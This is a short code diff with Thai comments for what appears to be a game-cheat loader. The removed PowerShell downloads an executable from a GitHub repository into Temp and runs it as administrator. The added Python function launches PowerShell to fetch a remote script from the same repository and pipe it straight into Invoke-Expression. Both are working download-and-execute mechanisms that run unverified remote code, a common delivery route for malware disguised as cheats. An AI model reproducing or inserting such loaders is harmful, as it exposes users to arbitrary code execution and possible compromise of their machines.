@@ -1,22 +1,17 @@
-# 1. ตั้งค่าตำแหน่งดาวน์โหลด (เก็บไว้ในโฟลเดอร์ Temp ของเครื่อง)
-$exeUrl = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader.exe"
-$outputPath = "$env:TEMP\_Loader.exe"
+import subprocess
 
-# 2. เริ่มการดาวน์โหลด
-Write-Host "Connecting to Server..." -ForegroundColor Cyan
-try {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop
-} catch {
-    Write-Host "ดาวน์โหลดไม่สำเร็จ! กรุณาเช็คอินเทอร์เน็ตหรือลิงก์ไฟล์" -ForegroundColor Red
-    pause
-    exit
-}
-
-# 3. รันไฟล์ EXE และเด้งเข้าหน้า CMD (ในฐานะ Admin)
-if (Test-Path $outputPath) {
-    Write-Host "Starting Loader..." -ForegroundColor Green
-    Start-Process -FilePath $outputPath -Verb RunAs
-} else {
-    Write-Host "ไม่พบไฟล์ในเครื่อง!" -ForegroundColor Red
-    pause
-}
+def start_cheat_callback():
+    print("กำลังเชื่อมต่อเซิร์ฟเวอร์และเริ่มทำงาน...")
+    
+    # คำสั่งจากรูปภาพของคุณ
+    powershell_command = 'iwr "https://raw.githubusercontent.com/lubyralph6-maker/newpower.ps1/refs/heads/main/newpower.ps1" | iex'
+    
+    try:
+        # สั่งรัน PowerShell พร้อมคำสั่งดังกล่าว
+        subprocess.Popen(["powershell", "-Command", powershell_command])
+        
+        # ถ้าอยากให้รันเสร็จแล้วปิดหน้า Loader ของเราไปเลย
+        # dpg.stop_dearpygui()
+        
+    except Exception as e:
+        print(f"เกิดข้อผิดพลาด: {e}")
